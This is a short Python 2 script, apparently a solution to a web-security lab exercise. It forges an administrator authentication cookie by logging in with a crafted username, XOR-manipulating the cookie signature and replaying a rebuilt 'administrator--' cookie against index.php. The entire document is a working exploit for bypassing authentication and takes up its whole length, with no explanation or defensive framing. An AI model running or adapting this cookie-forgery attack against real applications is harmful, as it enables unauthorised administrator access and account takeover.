import base64
import urllib
import requests

proxies = {} #{ 'http': 'http://127.0.0.1:8080' }

host = "http://ptl-8ff4ac6b-43d4ac51.libcurl.so/"
url = host+"login.php"

username1 = "administ"
password = "Password1"
data = {"username":username1,"password":password}
response = requests.post(url,data = data, proxies = proxies, allow_redirects=False);

cookie = response.headers['Set-Cookie']
auth1 = cookie.split("=")[1]
print "auth1:",auth1,response.status_code
sign1 = base64.urlsafe_b64decode(auth1).split('--')[1]

def myXor(str1, str2):
    s = ""
    for ind in range(len(str1)):
        s += chr( ord(str1[ind]) ^ ord(str2[ind]))
    return s

username2 = myXor(sign1,"rator\00\00\00")
password = "Password1"
data = {"username":username2,"password":password}

response = requests.post(url,data = data, proxies = proxies, allow_redirects=False);

auth2 = response.headers['Set-Cookie'].split("=")[1]
print 'auth2',auth2,response.status_code
sign = base64.urlsafe_b64decode(auth2.replace("%2B",'+')).split('--')[1]
print sign
admin_auth = "administrator--"+sign
cookie =  "auth="+base64.b64encode(admin_auth).replace('=','')
print cookie
headers = {"Cookie":cookie}
url =  host+"index.php"
response = requests.get(url,headers = headers)
print response.text,response.status_code


